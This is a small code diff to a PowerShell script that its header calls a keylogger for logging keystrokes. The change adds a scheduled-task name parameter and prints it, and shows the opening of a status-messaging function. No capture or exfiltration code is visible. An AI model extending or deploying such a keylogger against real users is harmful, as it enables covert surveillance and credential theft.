@@ -2,8 +2,12 @@
 #
 # keylogger - for logging keystrokes
 #
-param($duration="120")
+param($duration="120", $taskname)
 $timestamp = Get-Date -Format "yyyyMMddTHHmmss"
+if ($taskName)
+{
+	write-host("Scheduled Task name: {0}" -f $taskName)
+}
 
 function Send-Message($stage="Init", $state="Unknown", $duration="N/A", $comment="N/A")
 {
